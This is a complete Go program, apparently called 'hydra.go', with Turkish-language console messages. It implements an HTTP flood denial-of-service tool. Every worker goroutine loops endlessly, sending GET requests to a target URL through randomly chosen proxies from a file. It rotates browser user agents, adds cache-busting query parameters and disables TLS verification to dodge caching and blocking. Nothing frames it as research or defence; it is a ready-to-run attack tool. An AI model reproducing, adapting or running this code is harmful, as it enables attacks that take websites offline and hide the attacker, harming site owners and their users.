package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"sync"
	"time"
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
}

func readProxyList(filePath string) ([]string, error) {
	file, err := os.Open(filePath)
	if err != nil { return nil, err }
	defer file.Close()
	var proxies []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() { proxies = append(proxies, scanner.Text()) }
	if err := scanner.Err(); err != nil { return nil, err }
	if len(proxies) == 0 { return nil, fmt.Errorf("proxy listesi boş") }
	return proxies, nil
}

func attack(targetURL string, proxies []string, wg *sync.WaitGroup) {
	defer wg.Done()
	for {
		proxyStr := proxies[rand.Intn(len(proxies))]
		proxyURL, err := url.Parse("http://" + proxyStr)
		if err != nil { continue }

		client := &http.Client{
			Transport: &http.Transport{
				Proxy: http.ProxyURL(proxyURL),
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			},
			Timeout: 5 * time.Second,
		}
		
		reqURL := fmt.Sprintf("%s?r=%d", targetURL, rand.Intn(999999))
		req, err := http.NewRequest("GET", reqURL, nil)
		if err != nil { continue }
		
		req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
		req.Header.Set("Cache-Control", "no-cache")
		req.Header.Set("Connection", "keep-alive")

		resp, err := client.Do(req)
		if err == nil { resp.Body.Close() }
	}
}

func main() {
	if len(os.Args) != 4 {
		fmt.Println("Kullanım: go run hydra.go <hedef_url> <proxy_dosyası.txt> <worker_sayısı>")
		return
	}
	proxies, err := readProxyList(os.Args[2])
	if err != nil { fmt.Printf("Hata: %s\n", err); return }

	fmt.Printf("--> Hedef: %s\n", os.Args[1])
	fmt.Printf("--> Worker: %s | Proxy: %d adet\n", os.Args[3], len(proxies))
	fmt.Println("Saldırı başlatılıyor... Durdurmak için CTRL+C.")

	workerCount, _ := strconv.Atoi(os.Args[3])
	var wg sync.WaitGroup
	rand.Seed(time.Now().UnixNano())

	for i := 0; i < workerCount; i++ {
		wg.Add(1)
		go attack(os.Args[1], proxies, &wg)
	}
	wg.Wait()
}